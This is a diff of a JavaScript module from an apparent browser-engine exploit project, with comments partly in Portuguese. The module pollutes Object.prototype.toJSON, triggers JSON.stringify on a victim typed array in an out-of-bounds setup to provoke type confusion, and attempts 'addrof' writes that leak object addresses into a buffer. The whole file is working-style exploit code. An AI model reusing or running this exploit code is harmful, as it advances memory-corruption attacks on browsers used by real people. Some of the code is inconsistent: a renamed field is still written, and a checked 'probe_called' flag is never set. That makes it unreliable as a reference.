@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v18_CorrectedCaptureLogAndFinalFocus)
+// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v18_FixExternalLoggingAndReEnableAddrof)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -9,7 +9,7 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF = "OriginalHeisenbug_TypedArrayAddrof_v18_CorrectedCaptureLogAndFinalFocus";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V18_FELRA = "OriginalHeisenbug_TypedArrayAddrof_v18_FixLogReAddrof";
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
@@ -21,27 +21,27 @@ let object_to_leak_B_v18 = null;
 let victim_typed_array_ref_v18 = null;
 let probe_call_count_v18 = 0;
 
-function toJSON_TA_Probe_CorrectedCapture() {
+function toJSON_TA_Probe_FixLogReAddrof() {
     probe_call_count_v18++;
     let current_call_details = {
         call_number: probe_call_count_v18,
-        probe_variant: "TA_Probe_Addrof_v18_CorrectedCaptureLogAndFinalFocus",
+        probe_variant: "TA_Probe_Addrof_v18_FixLogReAddrof",
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
         this_is_victim_ref: false,
         this_is_prev_probe_return_marker: false,
         prev_probe_call_marker_val: null,
-        writes_attempted_on_this: false,
-        this_keys_after_write: null
+        writes_attempted_on_confused_this: false,
+        confused_this_keys_after_write: null
     };
 
     try {
         current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
         current_call_details.this_is_victim_ref = (this === victim_typed_array_ref_v18);
         
-        if (typeof this === 'object' && this !== null && this.hasOwnProperty('probe_source_call_marker_v18')) {
+        if (typeof this === 'object' && this !== null && this.hasOwnProperty('probe_marker_v18')) {
             current_call_details.this_is_prev_probe_return_marker = true;
-            current_call_details.prev_probe_call_marker_val = this.probe_source_call_marker_v18;
+            current_call_details.prev_probe_call_marker_val = this.probe_marker_v18;
         }
 
         logS3(`[${current_call_details.probe_variant}] Probe Call #${current_call_details.call_number}. 'this' type: ${current_call_details.this_type_in_toJSON}. IsVictim? ${current_call_details.this_is_victim_ref}. IsPrevReturnMarker? ${current_call_details.this_is_prev_probe_return_marker}${current_call_details.this_is_prev_probe_return_marker ? " (from call #" + current_call_details.prev_probe_call_marker_val + ")" : ""}`, "leak");
@@ -50,15 +50,20 @@ function toJSON_TA_Probe_CorrectedCapture() {
             logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: TYPE CONFUSION DETECTED for 'this'! (IsVictim? ${current_call_details.this_is_victim_ref}, IsPrevReturnMarker? ${current_call_details.this_is_prev_probe_return_marker})`, "vuln");
             
             logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Attempting addrof writes on this confused 'this'...`, "warn");
-            if (object_to_leak_A_v18) this[0] = object_to_leak_A_v18; // REATIVADO
-            if (object_to_leak_B_v18) this[1] = object_to_leak_B_v18; // REATIVADO
+            if (object_to_leak_A_v18) {
+                this[0] = object_to_leak_A_v18; // Re-ativado
+                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v18 to this[0].`, "info");
+            }
+            if (object_to_leak_B_v18) {
+                this[1] = object_to_leak_B_v18; // Re-ativado
+                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v18 to this[1].`, "info");
+            }
             current_call_details.writes_attempted_on_this = true;
             try {
-                current_call_details.this_keys_after_write = Object.keys(this);
-                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Writes to confused 'this' attempted. 'this' keys now: ${current_call_details.this_keys_after_write.join(',')}`, "info");
-            } catch (e_keys) {
-                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Error getting keys from 'this' after write: ${e_keys.message}`, "warn");
-                current_call_details.this_keys_after_write = ["Error getting keys"];
+                current_call_details.confused_this_keys_after_write = Object.keys(this);
+                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Confused 'this' keys after writes: ${current_call_details.confused_this_keys_after_write.join(',')}`, "info");
+            } catch (e_keys) { 
+                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Error getting keys from confused 'this' after write: ${e_keys.message}`, "warn");
             }
         } else if (current_call_details.this_is_victim_ref) {
             logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: 'this' is victim, type is ${current_call_details.this_type_in_toJSON}.`, "info");
@@ -67,27 +72,26 @@ function toJSON_TA_Probe_CorrectedCapture() {
         current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
     }
     
-    latest_known_probe_details_v18 = current_call_details; // Atribuição de referência direta
-    logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number} FINISHING. Global 'latest_known_probe_details_v18' ASSIGNED. Contents: ${JSON.stringify(latest_known_probe_details_v18)}`, "dev_verbose");
+    latest_known_probe_details_v18 = current_call_details; // Atribuição direta da referência local à global
+    logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number} FINISHING. Global 'latest_known_probe_details_v18' now points to this call's 'current_call_details' object.`, "dev_verbose");
 
-    return { "probe_source_call_marker_v18": current_call_details.call_number }; 
+    return { "probe_marker_v18": current_call_details.call_number }; 
 }
 
-export async function executeTypedArrayVictimAddrofTest_CorrectedCaptureLogAndFinalFocus() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}.triggerAndLog`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (CorrectedCaptureLogAndFinalFocus) & Addrof ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF} Init...`;
+export async function executeTypedArrayVictimAddrofTest_FixExternalLoggingAndReEnableAddrof() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_FELRA}.triggerAndLog`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (FixExternalLoggingAndReEnableAddrof) & Addrof ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_FELRA} Init...`;
 
     probe_call_count_v18 = 0;
     latest_known_probe_details_v18 = null; 
     victim_typed_array_ref_v18 = null; 
-    object_to_leak_A_v18 = { marker: "ObjA_TA_v18clff", id: Date.now() }; 
-    object_to_leak_B_v18 = { marker: "ObjB_TA_v18clff", id: Date.now() + Math.floor(Math.random() * 1000) };
+    object_to_leak_A_v18 = { marker: "ObjA_TA_v18felra", id: Date.now() }; 
+    object_to_leak_B_v18 = { marker: "ObjB_TA_v18felra", id: Date.now() + Math.floor(Math.random() * 1000) };
 
     let errorCapturedMain = null;
     let stringifyOutput = null; 
     let captured_details_of_last_probe_run = null; 
-    let heisenbugConfirmedByCapturedLogic = false;
     
     let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A: Default" };
     let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B: Default" };
@@ -110,32 +114,34 @@ export async function executeTypedArrayVictimAddrofTest_CorrectedCaptureLogAndFi
         let pollutionApplied = false;
 
         try {
-            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_CorrectedCapture, writable: true, configurable: true, enumerable: false });
+            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FixLogReAddrof, writable: true, configurable: true, enumerable: false });
             pollutionApplied = true;
             logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);
-            
-            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v18)...`, "warn", FNAME_CURRENT_TEST);
             stringifyOutput = JSON.stringify(victim_typed_array_ref_v18); 
             logS3(`  JSON.stringify completed. Stringify Output (first 100 chars): ${stringifyOutput ? stringifyOutput.substring(0,100) + "..." : 'N/A'}`, "info", FNAME_CURRENT_TEST);
             
             // FAZ UMA CÓPIA PROFUNDA da variável global latest_known_probe_details_v18
-            // Esta é a leitura crucial do estado final da sonda.
-            if (latest_known_probe_details_v18) { // latest_known_probe_details_v18 DEVE ser o objeto da última chamada
+            // Esta cópia deve ser estável e refletir o estado da ÚLTIMA chamada da sonda.
+            if (latest_known_probe_details_v18) { // latest_known_probe_details_v18 é uma referência ao current_call_details da última sonda
                 captured_details_of_last_probe_run = JSON.parse(JSON.stringify(latest_known_probe_details_v18)); 
             }
-            logS3(`  EXECUTE: Captured details of LAST probe run (deep copy of global 'latest_known_probe_details_v18'): ${captured_details_of_last_probe_run ? JSON.stringify(captured_details_of_last_probe_run) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+            logS3(`  EXECUTE: Captured details of LAST probe run (deep copy of global): ${captured_details_of_last_probe_run ? JSON.stringify(captured_details_of_last_probe_run) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
+            let heisenbugConfirmed = false;
             if (captured_details_of_last_probe_run && 
                 captured_details_of_last_probe_run.probe_called &&
                 captured_details_of_last_probe_run.this_type_in_toJSON === "[object Object]") {
-                heisenbugConfirmedByCapturedLogic = true;
-                logS3(`  EXECUTE: HEISENBUG CONFIRMED by captured_details_of_last_probe_run! 'this' type: ${captured_details_of_last_probe_run.this_type_in_toJSON} (Call #${captured_details_of_last_probe_run.call_number})`, "vuln", FNAME_CURRENT_TEST);
+                heisenbugConfirmed = true;
+                logS3(`  EXECUTE: HEISENBUG CONFIRMED by captured_details_of_last_probe_run! 'this' type: ${captured_details_of_last_probe_run.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
+                logS3(`    Details from that call (#${captured_details_of_last_probe_run.call_number}): IsVictim? ${captured_details_of_last_probe_run.this_is_victim_ref}, IsPrevReturnMarker? ${captured_details_of_last_probe_run.this_is_prev_probe_return_marker}, WritesAttempted? ${captured_details_of_last_probe_run.writes_attempted_on_this}`, "info");
+                if (captured_details_of_last_probe_run.writes_attempted_on_this) {
+                     logS3(`      Keys of 'this' after writes in that call: ${captured_details_of_last_probe_run.confused_this_keys_after_write ? captured_details_of_last_probe_run.confused_this_keys_after_write.join(',') : 'N/A'}`, "leak");
+                }
             } else {
                 logS3(`  EXECUTE: ALERT: Heisenbug NOT confirmed by captured_details_of_last_probe_run. Last type: ${captured_details_of_last_probe_run ? captured_details_of_last_probe_run.this_type_in_toJSON : 'N/A (or probe not called)'}`, "error", FNAME_CURRENT_TEST);
             }
                 
             logS3("STEP 3: Checking victim buffer...", "warn", FNAME_CURRENT_TEST);
-            // ... (Lógica de verificação de addrof_result_A e addrof_result_B)
             const val_A = float64_view_on_underlying_ab[0];
             addrof_result_A.leaked_address_as_double = val_A;
             let temp_A = new ArrayBuffer(8); new Float64Array(temp_A)[0] = val_A;
@@ -144,7 +150,7 @@ export async function executeTypedArrayVictimAddrofTest_CorrectedCaptureLogAndFi
                 addrof_result_A.success = true;
                 addrof_result_A.message = "Possible pointer for ObjA.";
             } else {
-                addrof_result_A.message = `No pointer for ObjA. ${heisenbugConfirmedByCapturedLogic ? "TC obs, " : ""}Buffer unchanged.`;
+                addrof_result_A.message = `No pointer for ObjA. ${heisenbugConfirmed ? "TC obs, " : ""}Buffer unchanged.`;
             }
 
             const val_B = float64_view_on_underlying_ab[1];
@@ -155,20 +161,20 @@ export async function executeTypedArrayVictimAddrofTest_CorrectedCaptureLogAndFi
                 addrof_result_B.success = true;
                 addrof_result_B.message = "Possible pointer for ObjB.";
             } else {
-                addrof_result_B.message = `No pointer for ObjB. ${heisenbugConfirmedByCapturedLogic ? "TC obs, " : ""}Buffer unchanged.`;
+                addrof_result_B.message = `No pointer for ObjB. ${heisenbugConfirmed ? "TC obs, " : ""}Buffer unchanged.`;
             }
 
             if (addrof_result_A.success || addrof_result_B.success) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}: Addr? SUCESSO!`;
-            } else if (heisenbugConfirmedByCapturedLogic) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}: Heisenbug OK, Addr Fail`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_FELRA}: Addr? SUCESSO!`;
+            } else if (heisenbugConfirmed) {
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_FELRA}: Heisenbug OK, Addr Fail`;
             } else {
-                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}: Heisenbug Fail?`;
+                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_FELRA}: Heisenbug Fail?`;
             }
 
         } catch (e_str) {
             errorCapturedMain = e_str;
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}: Stringify/Addrof ERR`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_FELRA}: Stringify/Addrof ERR`;
         } finally {
             if (pollutionApplied) {
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
@@ -176,7 +182,7 @@ export async function executeTypedArrayVictimAddrofTest_CorrectedCaptureLogAndFi
         }
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF} CRITICAL FAIL`;
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_FELRA} CRITICAL FAIL`;
     } finally {
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
@@ -193,7 +199,7 @@ export async function executeTypedArrayVictimAddrofTest_CorrectedCaptureLogAndFi
         potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
         stringifyResult: stringifyOutput, 
         toJSON_details: captured_details_of_last_probe_run, 
-        total_probe_calls: probe_call_count_v18, // será 0 aqui, o runner deve usar o log interno
+        total_probe_calls: probe_call_count_v18,
         addrof_A_attempt_result: addrof_result_A,
         addrof_B_attempt_result: addrof_result_B
     };
